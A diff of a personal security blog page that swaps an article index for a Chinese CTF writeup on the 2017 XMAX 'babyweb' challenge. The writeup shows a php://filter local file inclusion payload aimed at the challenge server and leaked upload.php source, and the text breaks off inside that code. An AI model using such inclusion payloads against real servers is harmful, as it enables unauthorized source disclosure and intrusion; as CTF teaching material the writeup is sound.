@@ -71,7 +71,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="web,pwn," />
+  <meta name="keywords" content="CTF,writeup,web," />
 
 
 
@@ -89,16 +89,20 @@
 
 
 
-<meta name="description" content="一些自己写的文章。">
+<meta name="description" content="文件上传、php伪协议、文件包含">
 <meta property="og:type" content="article">
-<meta property="og:title" content="一些文章">
-<meta property="og:url" content="http://yoursite.com/3017/07/26/一些文章/index.html">
+<meta property="og:title" content="XMAX夏令营-2017-babyweb-writeup">
+<meta property="og:url" content="http://yoursite.com/2017/08/22/XMAX夏令营-2017-babyweb-writeup/index.html">
 <meta property="og:site_name" content="Chybeta">
-<meta property="og:description" content="一些自己写的文章。">
-<meta property="og:updated_time" content="2017-08-21T00:33:50.549Z">
+<meta property="og:description" content="文件上传、php伪协议、文件包含">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/1.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/2.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/3.png?raw=true">
+<meta property="og:updated_time" content="2017-08-22T08:57:33.532Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="一些文章">
-<meta name="twitter:description" content="一些自己写的文章。">
+<meta name="twitter:title" content="XMAX夏令营-2017-babyweb-writeup">
+<meta name="twitter:description" content="文件上传、php伪协议、文件包含">
+<meta name="twitter:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/1.png?raw=true">
 
 
 
@@ -126,13 +130,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/3017/07/26/一些文章/"/>
+  <link rel="canonical" href="http://yoursite.com/2017/08/22/XMAX夏令营-2017-babyweb-writeup/"/>
 
 
 
 
 
-  <title> 一些文章 | Chybeta </title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  <title> XMAX夏令营-2017-babyweb-writeup | Chybeta </title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -298,7 +302,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://yoursite.com/3017/07/26/一些文章/">
+  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/22/XMAX夏令营-2017-babyweb-writeup/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="name" content="chybeta">
@@ -322,7 +326,7 @@
             
             
               
-                一些文章
+                XMAX夏令营-2017-babyweb-writeup
               
             
           </h1>
@@ -337,8 +341,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="3017-07-26T19:27:04+08:00">
-                3017-07-26
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-08-22T13:37:42+08:00">
+                2017-08-22
               </time>
             
 
@@ -360,8 +364,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/随笔/" itemprop="url" rel="index">
-                    <span itemprop="name">随笔</span>
+                  <a href="/categories/writeup-Web/" itemprop="url" rel="index">
+                    <span itemprop="name">writeup:Web</span>
                   </a>
                 </span>
 
@@ -379,7 +383,7 @@
 
           
           
-             <span id="/3017/07/26/一些文章/" class="leancloud_visitors" data-flag-title="一些文章">
+             <span id="/2017/08/22/XMAX夏令营-2017-babyweb-writeup/" class="leancloud_visitors" data-flag-title="XMAX夏令营-2017-babyweb-writeup">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -406,121 +410,28 @@
       
 
       
-        <p>一些自己写的文章。<br><a id="more"></a></p>
-<h1 id="Project"><a href="#Project" class="headerlink" title="Project"></a>Project</h1><ul>
-<li><a href="https://github.com/CHYbeta/Web-Security-Learning" target="_blank" rel="external">Web-Security-Learning</a></li>
-<li><a href="https://github.com/CHYbeta/Software-Security-Learning" target="_blank" rel="external">Software-Security-Learning</a></li>
-<li><a href="https://github.com/CHYbeta/cmsPoc" target="_blank" rel="external">cmsPoc:CMS渗透测试框架 </a></li>
-<li><a href="https://chybeta.gitbooks.io/the-path-to-machine-learning/content/" target="_blank" rel="external">The Path to Machine Learning</a></li>
-<li><a href="https://book.ph0en1x.com/" target="_blank" rel="external">Awesome CTF Book</a></li>
-<li><a href="https://chybeta.gitbooks.io/vuln-time/content/" target="_blank" rel="external">Vuln-Time</a></li>
-</ul>
-<h1 id="Web-Security"><a href="#Web-Security" class="headerlink" title="Web Security"></a>Web Security</h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><ul>
-<li><a href="https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/" target="_blank" rel="external">命令执行的一些绕过技巧</a></li>
-<li><a href="https://chybeta.github.io/2017/07/26/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_blank" rel="external">php代码执行漏洞</a></li>
-<li><a href="https://chybeta.github.io/2017/07/21/MySql%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/" target="_blank" rel="external">MySql注入备忘录</a></li>
-<li><a href="https://chybeta.github.io/2017/07/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%80%BB%E7%BB%93/" target="_blank" rel="external">php代码审计小总结 </a></li>
-<li><a href="https://chybeta.github.io/2017/07/04/%E5%B0%8F%E8%AF%95XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/" target="_blank" rel="external">小试XML实体注入攻击 </a></li>
-<li><a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="external">浅谈php反序列化漏洞</a></li>
-<li><a href="https://chybeta.github.io/2017/05/13/%E5%88%A9%E7%94%A8PHP%E7%9A%84OPcache%E6%9C%BA%E5%88%B6getshell/" target="_blank" rel="external">利用PHP的OPcache机制getshell</a></li>
-</ul>
-<h2 id="Vuln-Analysis"><a href="#Vuln-Analysis" class="headerlink" title="Vuln Analysis"></a>Vuln Analysis</h2><ul>
-<li><a href="https://chybeta.github.io/2017/08/04/%C2%96PHPCMS-v9-6-0-wap%E6%A8%A1%E5%9D%97sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="external">PHPCMS v9.6.0 wap模块sql注入漏洞分析</a></li>
-<li><a href="https://chybeta.github.io/2017/07/22/PHPCMS-v9-6-0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="external">PHPCMS v9.6.0 任意文件上传漏洞分析 </a></li>
-<li><a href="https://chybeta.github.io/2017/07/11/Catfish-%E9%B2%B6%E9%B1%BC-CMS-V-4-4-10-%E7%95%99%E8%A8%80%E6%9D%BF%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E/" target="_blank" rel="external">Catfish(鲶鱼) CMS V 4.4.10 留言板存储型XSS漏洞</a></li>
-<li><a href="https://chybeta.github.io/2017/05/19/CVE-2017-8917-Joomla-3-7-0-SQL-Injection%E5%88%86%E6%9E%90/" target="_blank" rel="external">[CVE-2017-8917]Joomla! 3.7.0 SQL Injection分析 </a></li>
-<li><a href="https://chybeta.github.io/2017/05/12/CVE-2017-7991-Exponent-CMS-2-4-1-SQL-Injection%E5%88%86%E6%9E%90/" target="_blank" rel="external">[CVE-2017-7991]Exponent CMS 2.4.1 SQL Injection分析 </a></li>
-<li><a href="https://chybeta.github.io/2017/03/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%EF%BC%9ABlueCMSv1-6-sp1/" target="_blank" rel="external">代码审计之SQL注入：BlueCMSv1.6 sp1 </a></li>
-</ul>
-<h1 id="Bin-Security"><a href="#Bin-Security" class="headerlink" title="Bin Security"></a>Bin Security</h1><ul>
-<li><a href="https://chybeta.github.io/2017/08/14/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/" target="_blank" rel="external">逆向学习笔记（一）</a></li>
-<li><a href="https://chybeta.github.io/2017/08/09/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%88%A9%E7%94%A8%E9%80%9A%E7%94%A8gadget/#more" target="_blank" rel="external">ROP学习：利用通用gadget </a></li>
-<li><a href="https://chybeta.github.io/2017/06/26/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA/" target="_blank" rel="external">ROP学习：64位栈溢出</a></li>
-</ul>
-<h1 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h1><ul>
-<li><a href="https://chybeta.github.io/2017/07/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95%EF%BC%9A%E6%9C%80%E8%BF%91%E9%82%BB-KNN/" target="_blank" rel="external">机器学习算法：最近邻(KNN)</a></li>
-<li><a href="https://chybeta.github.io/2017/07/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95-%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron/" target="_blank" rel="external">机器学习算法：感知机(perceptron) </a></li>
-<li><a href="https://chybeta.github.io/2017/07/06/Tensorflow%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%B8%B8%E7%94%A8API/" target="_blank" rel="external">Tensorflow学习：常用API</a></li>
-<li><a href="https://chybeta.github.io/2017/03/15/win%E4%B8%8Btensorflow%E5%AE%89%E8%A3%85%E9%81%BF%E5%9D%91%E6%8C%87%E5%8D%97-0/" target="_blank" rel="external">win下tensorflow安装避坑指南</a></li>
-</ul>
-<h1 id="数据挖掘"><a href="#数据挖掘" class="headerlink" title="数据挖掘"></a>数据挖掘</h1><ul>
-<li><a href="https://chybeta.github.io/2017/01/22/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%880%EF%BC%89%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B9%8Banaconda%E5%AE%89%E8%A3%85/" target="_blank" rel="external">数据挖掘比赛（0）环境搭建之anaconda安装</a></li>
-<li><a href="https://chybeta.github.io/2017/01/24/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%881%EF%BC%89%E5%AF%B9%E6%97%A0%E5%88%97%E5%90%8D%E7%9A%84txt%E6%95%B0%E6%8D%AE%E9%9B%86%E8%AF%BB%E5%8F%96%E6%96%B9%E6%B3%95%E5%8F%8A%E5%A4%84%E7%90%86/" target="_blank" rel="external">数据挖掘比赛（1）对无列名的txt数据集读取方法及处理</a></li>
-<li><a href="https://chybeta.github.io/2017/01/25/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%882%EF%BC%89%E5%88%A9%E7%94%A8pandas%E8%AF%BB%E5%8F%96%E5%A4%A7%E5%9E%8B%E6%95%B0%E6%8D%AE%E9%9B%86/" target="_blank" rel="external">数据挖掘比赛（2）利用pandas读取大型数据集</a></li>
-<li><a href="https://chybeta.github.io/2017/01/29/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%883%EF%BC%89%E7%94%B3%E8%AF%B7anaconda-academic-license%E5%B9%B6%E4%BD%BF%E7%94%A8/" target="_blank" rel="external">数据挖掘比赛（3）申请anaconda-academic-license并使用</a></li>
-<li><a href="https://chybeta.github.io/2017/02/01/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%884%EF%BC%89ten-Minutes-to-pandas%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%8A/" target="_blank" rel="external">数据挖掘比赛（4）ten Minutes to pandas中文版上 </a></li>
-<li><a href="https://chybeta.github.io/2017/02/02/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%885%EF%BC%89ten-Minutes-to-pandas%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%8B/" target="_blank" rel="external">数据挖掘比赛（5）ten Minutes to pandas中文版下</a></li>
-</ul>
-<h1 id="技术杂谈"><a href="#技术杂谈" class="headerlink" title="技术杂谈"></a>技术杂谈</h1><ul>
-<li><a href="https://chybeta.github.io/2017/02/14/win%E4%B8%8BDocker%E9%BB%98%E8%AE%A4%E5%AD%98%E5%82%A8%E4%BD%8D%E7%BD%AE%E4%BF%AE%E6%94%B9/" target="_blank" rel="external">win下Docker默认存储位置修改</a></li>
-<li><a href="https://chybeta.github.io/2017/02/13/windows%E5%B9%B3%E5%8F%B0%E4%B8%8BDocker%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" target="_blank" rel="external">windows平台下Docker环境搭建</a></li>
-</ul>
-<h1 id="编程练习"><a href="#编程练习" class="headerlink" title="编程练习"></a>编程练习</h1><ul>
-<li><a href="https://chybeta.github.io/3017/06/19/ACM-OJ-%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0/" target="_blank" rel="external">ACM-OJ[长期更新]</a></li>
-<li><a href="https://chybeta.github.io/2017/08/12/hihoCoder-162%E5%91%A8%EF%BC%9A%E5%9B%9E%E6%96%87%E5%AD%97%E7%AC%A6%E4%B8%B2/" target="_blank" rel="external">hihoCoder 162周：回文字符串 </a></li>
-<li><a href="https://chybeta.github.io/2017/03/02/CodeTrain-3-%E6%95%B0%E7%BB%84%E5%8D%95%E8%B0%83%E5%92%8C/" target="_blank" rel="external">CodeTrain(3)数组单调和</a></li>
-<li><a href="https://chybeta.github.io/2017/03/02/CodeTrain-2-%E6%A3%8B%E5%AD%90%E7%BF%BB%E8%BD%AC/" target="_blank" rel="external">CodeTrain(2)棋子翻转</a></li>
-<li><a href="https://chybeta.github.io/2017/03/02/CodeTrain-1-%E6%9C%80%E5%A4%A7%E5%B7%AE%E5%80%BC/" target="_blank" rel="external">CodeTrain(1)最大差值</a></li>
-</ul>
-<h1 id="随笔"><a href="#随笔" class="headerlink" title="随笔"></a>随笔</h1><ul>
-<li><a href="https://chybeta.github.io/2017/02/17/%E8%AE%B02017%E5%B9%B4%E9%98%BF%E9%87%8C%E5%B7%B4%E5%B7%B4%E4%B9%8B%E8%A1%8C/" target="_blank" rel="external"> 记2017年阿里巴巴之行
-</a></li>
-</ul>
-<h1 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
-<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-default-writeup/" target="_blank" rel="external">XNUCA 2017-Web专题赛前指导-default-writeup</a></li>
-<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E9%98%B3%E5%85%89%E6%80%BB%E5%9C%A8%E9%A3%8E%E9%9B%A8%E5%90%8E-writeup/" target="_blank" rel="external">XNUCA 2017-Web专题赛前指导-阳光总在风雨后-writeup </a></li>
-<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-Document-writeup/" target="_blank" rel="external">XNUCA 2017-Web专题赛前指导-Document-writeup</a></li>
-<li><a href="https://chybeta.github.io/2017/08/17/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E6%9C%80%E5%AE%89%E5%85%A8%E7%9A%84%E7%AC%94%E8%AE%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-writeup/" target="_blank" rel="external">XNUCA 2017-Web专题赛前指导-最安全的笔记管理系统-writeup </a></li>
-<li><a href="https://chybeta.github.io/2017/08/18/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-vote-writeup/" target="_blank" rel="external">XNUCA 2017-Web专题赛前指导-vote-writeup</a></li>
-<li><a href="https://chybeta.github.io/2017/08/18/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-php%E6%98%AF%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80-writeup/" target="_blank" rel="external">XNUCA 2017-Web专题赛前指导-php是最好的语言-writeup</a></li>
-<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E9%83%A8%E5%88%86%E7%AE%80%E5%8D%95%E9%A2%98%E6%B1%87%E6%80%BB-writeup/" target="_blank" rel="external">XNUCA 2017-Web专题赛前指导-部分简单题汇总-writeup</a></li>
-<li><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/" target="_blank" rel="external">SHACTF-2017-Web-writeup</a></li>
-<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-web-writeup/" target="_blank" rel="external">BugsBunnyCTF2017-web-writeup</a></li>
-<li><a href="https://chybeta.github.io/2017/07/24/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-writeup/" target="_blank" rel="external">实验吧-web-writeup</a></li>
-<li><a href="https://chybeta.github.io/2017/07/19/CTFZone-2017-Leaked-messages-writeup/" target="_blank" rel="external">CTFZone-2017-Leaked messages-writeup</a></li>
-<li><a href="https://chybeta.github.io/2017/07/16/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-web-writeup/" target="_blank" rel="external">XMAN选拔赛-2017-web-writeup </a></li>
-<li><a href="https://chybeta.github.io/2017/07/16/Meenpwn-2017-web-writeup/" target="_blank" rel="external">Meenpwn-2017-web-writeup </a></li>
-<li><a href="https://chybeta.github.io/2017/07/15/%E4%B8%80%E9%81%93%E5%A5%BD%E7%8E%A9%E7%9A%84webshell%E9%A2%98/" target="_blank" rel="external">一道好玩的webshell题 </a></li>
-<li><a href="https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/" target="_blank" rel="external">jarvisoj-web-writeup</a></li>
-<li><a href="https://chybeta.github.io/2017/06/30/%C2%96ringzer0team-js-writeup/" target="_blank" rel="external">ringzer0team-js-writeup </a></li>
-<li><a href="https://chybeta.github.io/2017/06/30/%C2%96ringzer0team-web-writeup/" target="_blank" rel="external">ringzer0team-web-writeup </a></li>
-<li><a href="https://chybeta.github.io/2017/06/25/xss-quiz-writeup/" target="_blank" rel="external">xss-quiz-writeup </a></li>
-<li><a href="https://chybeta.github.io/2017/06/19/GCTF-web-writeup/" target="_blank" rel="external">GCTF-web-writeup </a></li>
-<li><a href="https://chybeta.github.io/2017/06/18/%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9Dweb-writeup/" target="_blank" rel="external">“春秋杯”web-writeup </a></li>
-<li><a href="https://chybeta.github.io/2017/01/12/%E5%8D%97%E9%82%AECTF%E5%B9%B3%E5%8F%B0web%E5%89%8D30%E9%A2%98%E8%A7%A3/" target="_blank" rel="external">南邮CTF平台web前30题解</a></li>
-</ul>
-<h3 id="sqli-lab"><a href="#sqli-lab" class="headerlink" title="sqli-lab"></a>sqli-lab</h3><ul>
-<li><a href="https://chybeta.github.io/2017/07/12/Sqli-Labs-Less7-writeup/" target="_blank" rel="external">Sqli-Labs:Less7-writeup</a></li>
-<li><a href="https://chybeta.github.io/2017/07/12/Sqli-Labs-Less5-6-writeup/" target="_blank" rel="external">Sqli-Labs:Less5-6-writeup </a></li>
-<li><a href="https://chybeta.github.io/2017/04/02/Sqli-Labs-Less1-4-writeup/" target="_blank" rel="external">Sqli-Labs:Less1-4-writeup</a></li>
-</ul>
-<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="CTF-1"><a href="#CTF-1" class="headerlink" title="CTF"></a>CTF</h3><ul>
-<li><a href="https://chybeta.github.io/2017/08/12/Codegate-2017-Qual-babypwn-writeup/" target="_blank" rel="external">Codegate 2017 Qual-babypwn-writeup</a></li>
-<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-pwn-writeup/" target="_blank" rel="external">BugsBunnyCTF2017-pwn-writeup</a></li>
-<li><a href="https://chybeta.github.io/2017/07/16/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-pwn-writeup/" target="_blank" rel="external">XMAN选拔赛-2017-pwn-writeup</a></li>
-<li><a href="https://chybeta.github.io/2017/06/29/XMAN-pwn-writeup/" target="_blank" rel="external">XMAN-pwn-writeup </a></li>
-<li><a href="https://chybeta.github.io/2017/06/28/SUCTF-2016-pwn400-writeup/" target="_blank" rel="external">SUCTF-2016-pwn400-writeup</a></li>
-</ul>
-<h3 id="pwnable-kr"><a href="#pwnable-kr" class="headerlink" title="pwnable.kr"></a>pwnable.kr</h3><ul>
-<li><a href="https://chybeta.github.io/2017/08/01/Pwnable-kr-shellshock/" target="_blank" rel="external">Pwnable.kr:shellshock</a></li>
-<li><a href="https://chybeta.github.io/2017/08/01/Pwnable-kr-mistake/" target="_blank" rel="external">Pwnable.kr:mistake</a></li>
-<li><a href="https://chybeta.github.io/2017/06/18/%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9Dweb-writeup/" target="_blank" rel="external">Pwnable.kr:random </a></li>
-<li><a href="https://chybeta.github.io/2017/04/08/Pwnable-kr-passcode/" target="_blank" rel="external">Pwnable.kr:passcode</a></li>
-<li><a href="https://chybeta.github.io/2017/04/07/Pwnable-kr-bof/" target="_blank" rel="external">Pwnable.kr:bof</a></li>
-</ul>
-<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul>
-<li><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Growing-Up-writeup/" target="_blank" rel="external">SHACTF-2017-Growing Up-writeup</a></li>
-<li><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-WannaFly-writeup/" target="_blank" rel="external">SHACTF-2017-WannaFly-writeup</a></li>
-<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-misc-writeup/" target="_blank" rel="external">BugsBunnyCTF2017-misc-writeup</a></li>
-<li><a href="https://chybeta.github.io/2017/07/23/0ctf-2015-Peers-writeup/" target="_blank" rel="external">0ctf-2015-Peers-writeup</a></li>
-<li><a href="https://chybeta.github.io/2017/07/17/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-misc-writeup/" target="_blank" rel="external">XMAN选拔赛-2017-misc-writeup</a></li>
-</ul>
-<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><ul>
-<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-crypto-writeup/" target="_blank" rel="external">BugsBunnyCTF2017-crypto-writeup</a></li>
-<li><a href="Meenpwn-2017-crypto-writeup">Meenpwn-2017-crypto-writeup</a></li>
-</ul>
-<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><ul>
-<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-Reverse-writeup/" target="_blank" rel="external">BugsBunnyCTF2017-Reverse-writeup</a></li>
+        <p>文件上传、php伪协议、文件包含<br><a id="more"></a></p>
+<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><p>题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://202.112.51.217:8199</div></pre></td></tr></table></figure></p>
+<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>一个图片上传功能（submit），还有一个图片查看功能（view）。点击后可发现url是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://202.112.51.217:8199/index.php?page=submit</div><div class="line">http://202.112.51.217:8199/index.php?page=view</div></pre></td></tr></table></figure></p>
+<p>在submit处有上传功能，对应的页面是upload.php。</p>
+<p>猜测有包含漏洞，用php伪协议读取源码，其余类似：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://202.112.51.217:8199/index.php?page=php://filter/read=convert.base64-encode/resource=upload</div></pre></td></tr></table></figure></p>
+<p>upload.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$error=$_FILES[<span class="string">'pic'</span>][<span class="string">'error'</span>];</div><div class="line">$tmpName=$_FILES[<span class="string">'pic'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">$name=$_FILES[<span class="string">'pic'</span>][<span class="string">'name'</span>];</div><div class="line">$size=$_FILES[<span class="string">'pic'</span>][<span class="string">'size'</span>];</div><div class="line">$type=$_FILES[<span class="string">'pic'</span>][<span class="string">'type'</span>];</div><div class="line"><span class="keyword">try</span>&#123;</div><div class="line">	<span class="keyword">if</span>($name!==<span class="string">""</span>)</div><div class="line">	&#123;</div><div class="line">		$name1=substr($name,<span class="number">-4</span>);</div><div class="line">		<span class="keyword">if</span>(($name1!==<span class="string">".gif"</span>) <span class="keyword">and</span> ($name1!==<span class="string">".jpg"</span>))</div><div class="line">		&#123;</div><div class="line">			<span class="keyword">echo</span> <span class="string">"hehe"</span>;</div><div class="line">			<span class="keyword">echo</span> <span class="string">"&lt;script language=javascript&gt;alert('不允许的文件类型！');history.go(-1)&lt;/script&gt;"</span>;</div><div class="line">			<span class="keyword">exit</span>;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">if</span>($type!==<span class="string">"image/jpeg"</span>&amp;&amp;$type!==<span class="string">"image/gif"</span>)</div><div class="line">		&#123;</div><div class="line">			<span class="comment">//echo mime_content_type($tmpName);</span></div><div class="line">			<span class="keyword">echo</span> <span class="string">"&lt;script language=javascript&gt;alert('不允许的文件类型！');history.go(-1)&lt;/script&gt;"</span>;</div><div class="line">			<span class="keyword">exit</span>;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">if</span>(is_uploaded_file($tmpName))&#123;</div><div class="line">			$time=time();</div><div class="line">			$rootpath=<span class="string">'uploads/'</span>.$time.$name1;</div><div class="line">			<span class="keyword">if</span>(!move_uploaded_file($tmpName,$rootpath))&#123;</div><div class="line">				<span class="keyword">echo</span> <span class="string">"&lt;script language='JavaScript'&gt;alert('文件移动失败!');window.location='index.php?page=submit'&lt;/script&gt;"</span>;</div><div class="line">				<span class="keyword">exit</span>;</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">else</span>&#123;</div><div class="line">				sleep(<span class="number">2</span>);				</div><div class="line">				<span class="keyword">if</span> ($type==<span class="string">'image/jpeg'</span>)</div><div class="line">				&#123;</div><div class="line">					$im = @imagecreatefromjpeg($rootpath);</div><div class="line">					<span class="keyword">if</span>(!$im)&#123;</div><div class="line">					  $im = imagecreatetruecolor(<span class="number">150</span>, <span class="number">30</span>);</div><div class="line">					  $bg = imagecolorallocate($im, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>);</div><div class="line">					  $text_color = imagecolorallocate($im, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>);</div><div class="line">					  imagefilledrectangle($im, <span class="number">0</span>, <span 